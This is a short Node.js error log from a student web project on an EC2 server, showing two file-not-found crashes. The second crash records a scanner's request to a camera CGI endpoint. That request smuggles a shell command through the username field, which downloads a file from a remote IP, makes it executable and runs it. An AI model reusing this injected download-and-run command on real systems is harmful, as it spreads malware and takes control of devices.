fs.js:115
    throw err;
    ^

Error: ENOENT: no such file or directory, open '/home/ec2-user/repo/Idea-Finder_CSE406/front-end/server.php'
    at Object.openSync (fs.js:436:3)
    at Object.readFileSync (fs.js:341:35)
    at Server.<anonymous> (/home/ec2-user/repo/Idea-Finder_CSE406/front-end/app.js:15:21)
    at Server.emit (events.js:182:13)
    at parserOnIncoming (_http_server.js:652:12)
    at HTTPParser.parserOnHeadersComplete (_http_common.js:109:17)
fs.js:115
    throw err;
    ^

Error: ENOENT: no such file or directory, open '/home/ec2-user/repo/Idea-Finder_CSE406/front-end/cgi-bin/nobody/Search.cgi?action=cgi_query&ip=google.com&port=80&queryb64str=Lw==&username=admin%20;XmlAp%20r%20Account.User1.Password%3E$(cd%20/tmp;%20wget%20http://209.141.33.119/avtechsh%20-O%20d4rk;%20chmod%20777%20d4rk;%20sh%20d4rk)&password=admin'
    at Object.openSync (fs.js:436:3)
    at Object.readFileSync (fs.js:341:35)
    at Server.<anonymous> (/home/ec2-user/repo/Idea-Finder_CSE406/front-end/app.js:15:21)
    at Server.emit (events.js:182:13)
    at parserOnIncoming (_http_server.js:652:12)
    at HTTPParser.parserOnHeadersComplete (_http_common.js:109:17)
